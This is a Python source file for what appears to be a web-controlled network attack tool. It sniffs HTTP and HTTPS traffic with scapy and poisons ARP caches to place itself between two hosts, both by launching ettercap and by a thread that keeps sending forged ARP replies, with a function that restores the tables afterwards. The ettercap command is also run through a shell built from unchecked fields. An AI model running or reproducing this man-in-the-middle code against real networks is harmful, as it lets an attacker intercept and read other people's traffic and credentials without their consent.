from scapy.all import *
from scapy.layers.http import HTTPRequest
from threading import Event, Thread
import subprocess
import json
import os
import signal
from flaskAndSocketServer import logger
import queue


class scapyUtil:
    _queue = queue.Queue()
    sniffRef = None
    dstmac = ''
    srcmac = ''
    dstIp = ''
    srcIp = ''
    networkIface = ''
    ettercapProcess = None
    arpPossingThread = None
    thread_event = Event()

    def __init__(self):
        pass

    def toJSON(self):
        print(self.__dict__)
        return json.dumps(self, default=lambda o: o.__dict__,
                          sort_keys=True)

    def process_packet(self, packet):
        packet_dict = {}
        for line in packet.show2(dump=True).split('\n'):
            if '###' in line:
                layer = line.strip('#[] ')
                packet_dict[layer] = {}
            elif '=' in line:
                key, val = line.split('=', 1)
                packet_dict[layer][key.strip()] = val.strip()     
        self._queue.put_nowait(json.dumps(packet_dict))

    def startSniffAsync(self):
        log("Starting Sniffer Async")
        if (self.sniffRef is None):
            self.sniffRef = AsyncSniffer(
                filter="tcp and (dst port 80 or dst port 8080 or dst port 443)", prn=self.process_packet, store=False)
                # filter="tcp", prn=self.process_packet, store=False)
            self.sniffRef.start()
            log(f"Started Succesfully with iface as {self.networkIface}")

    def sstopSniffer(self):
        if self.sniffRef is not None:
            self.sniffRef.stop()
            log("Sniffer Stopped at scapy level")
            self.sniffRef = None
    ###################################
    '''
    ARP with etterCap
    '''

    def startetterCapForwithoutMac(self):

        if self.ettercapProcess is not None:
            os.killpg(os.getpgid(self.ettercapProcess.pid), signal.SIGTERM)
        if (self.srcIp != '' and self.dstIp != ''):
            # ettercap -T -S -i eth0 -M arp:remote /192.168.1.1// /192.168.1.7//
            command = f"ettercap -T -S -i {self.networkIface} -M arp:remote /{self.srcIp}// /{self.dstIp}//"
            log(command)
            self.ettercapProcess = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,preexec_fn=os.setsid)
            return True
        else:
            return False

    def stopetterCapForWithoutMac(self):
        try:
            if self.ettercapProcess is not None:
                # grep_stdout = self.ettercapProcess.communicate(input='q')
                os.killpg(os.getpgid(self.ettercapProcess.pid), signal.SIGTERM)
                # self.ettercapProcess.kill()
                self.ettercapProcess = None
                return True
        except Exception as e:
            return False

    def setMacForSrc(self):
        self.srcmac = self.get_mac(self.srcIp)

    def setMacForDst(self):
        self.dstmac = self.get_mac(self.dstIp)
    ###################################

    ###################################
    """
    ARP Possing With Scapy
    """

    def runArpPossingUsingScapy(self):
        if (self.srcIp == '' or self.dstIp == ''):
            return False
        if (self.srcmac == ''):
            self.setMacForSrc()
        if (self.dstmac == ''):
            self.setMacForDst()
        try:
            if (self.arpPossingThread is None):
                self.thread_event.set()
                self.arpPossingThread = Thread(target=self.arpPossingWithScapy)
                self.arpPossingThread.start()
                print("Scapy is Started in thread")
                return True
        except Exception as e:
            self.print("error",e)

        return False

    def arpPossingWithScapy(self):
        try:
            print("started thread Scapy")
            while self.thread_event.is_set():
                self.spoofarpcache(self.dstIp, self.dstmac, self.srcIp)
                self.spoofarpcache(self.srcIp, self.srcmac, self.dstIp)
        finally:
            self.thread_event.clear()
            self.arpPossingThread = None

    def stopArpPossingUsingScapy(self):
        try:
            if (self.arpPossingThread is not None):
                self.thread_event.clear()
                self.arpPossingThread.join()
                self.restorearp(self.srcIp, self.srcmac,
                                self.dstIp, self.dstmac)
                self.restorearp(self.dstIp, self.dstmac,
                                self.srcIp, self.srcmac)
                return True
        except Exception as e:
            return False

    def get_mac(self, traget):
        arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=traget)
        targetmac = srp(arppacket, timeout=2)[0][0][1].hwsrc
        return targetmac

    def spoofarpcache(self, targetip, targetmac, sourceip):
        spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
        send(spoofed, verbose=False)

    def restorearp(self, targetip, targetmac, sourceip, sourcemac):
        packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip,
                     hwdst=targetmac, pdst=targetip)
        send(packet, verbose=False)
        log("ARP Table restored to normal for", targetip)

    ###################################


def log(msg: str) -> None:
    logger.debug(msg)
